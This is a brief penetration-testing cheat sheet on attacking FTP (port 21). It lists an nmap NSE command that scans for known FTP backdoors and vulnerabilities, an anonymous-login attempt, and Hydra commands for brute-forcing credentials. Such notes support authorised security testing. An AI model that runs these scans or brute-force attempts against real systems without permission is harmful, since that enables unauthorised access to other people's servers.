# 21\_FTP

## Background

If you can't get access to FTP through these steps, then you need credentials from some other area to authenticate.

## Exploit

### Test NSE Common Vulnerabilities

NSE has a number of scripts available to test for common vulnerabilities in this service.

```text
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
```

### Anonymous Login

Many FTP servers allow anonymous users to authenticate. Always attempt to login with anonymous credentials.

```text
ftp [IP] username: [anonymous or anon] password: [anonymous or password]
```

### Brute Force

Hydra has a built-in module for attempting usernames and passwords over FTP.

```text
hydra -t 1 -L [username list/file] -P [password list/file] -vV ftp://[IP]:21
```

```text
hydra -t 1 -C [colon separated username and password list/file] -vV ftp://[IP]:21
```
